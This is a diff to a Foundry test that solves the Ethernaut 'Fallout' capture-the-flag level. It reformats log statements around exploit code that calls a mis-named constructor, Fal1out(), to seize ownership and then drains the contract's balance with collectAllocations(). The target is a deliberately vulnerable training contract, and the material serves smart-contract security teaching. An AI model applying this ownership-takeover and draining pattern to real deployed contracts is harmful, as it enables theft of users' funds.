@@ -43,20 +43,11 @@ contract FalloutTest is Test {
         Fallout falloutContract = Fallout(payable(levelAddress));
         vm.deal(address(falloutContract), 1 ether);
 
-        emit log_named_address(
-            "The original owner of the contract: ",
-            falloutContract.owner()
-        );
-        emit log_named_address(
-            "Address of the exploit contract: ",
-            address(this)
-        );
+        emit log_named_address("The original owner of the contract: ", falloutContract.owner());
+        emit log_named_address("Address of the exploit contract: ", address(this));
         emit log_named_address("Eve's address: ", address(eve));
         emit log_named_uint("Balance of Eve (before): ", eve.balance);
-        emit log_named_uint(
-            "Contract balance (before): ",
-            address(falloutContract).balance
-        );
+        emit log_named_uint("Contract balance (before): ", address(falloutContract).balance);
 
         /*//////////////////////////////////////////////////////////////
                                 LEVEL EXPLOIT
@@ -66,18 +57,12 @@ contract FalloutTest is Test {
         emit log_string("Calling Fal1out() function... 🧨 ");
         falloutContract.Fal1out();
 
-        emit log_named_address(
-            "New owner of the contract: ",
-            falloutContract.owner()
-        );
+        emit log_named_address("New owner of the contract: ", falloutContract.owner());
 
         // draining the contract
         emit log_string("Calling collectAllocations() function ... 👸");
         falloutContract.collectAllocations();
-        emit log_named_uint(
-            "Balance of the contract (after): ",
-            address(falloutContract).balance
-        );
+        emit log_named_uint("Balance of the contract (after): ", address(falloutContract).balance);
 
         emit log_named_uint("Balance of Eve (after): ", eve.balance);
 
@@ -85,9 +70,7 @@ contract FalloutTest is Test {
                                 LEVEL SUBMISSION
         //////////////////////////////////////////////////////////////*/
 
-        bool challengeCompleted = ethernaut.submitLevelInstance(
-            payable(levelAddress)
-        );
+        bool challengeCompleted = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(challengeCompleted);
     }
@@ -105,9 +88,7 @@ contract FalloutTest is Test {
      * an address for that person
      */
     function makeNameForAddress(string memory name) public returns (address) {
-        address addr = address(
-            uint160(uint256(keccak256(abi.encodePacked(name))))
-        );
+        address addr = address(uint160(uint256(keccak256(abi.encodePacked(name)))));
         vm.label(addr, name);
         return addr;
     }
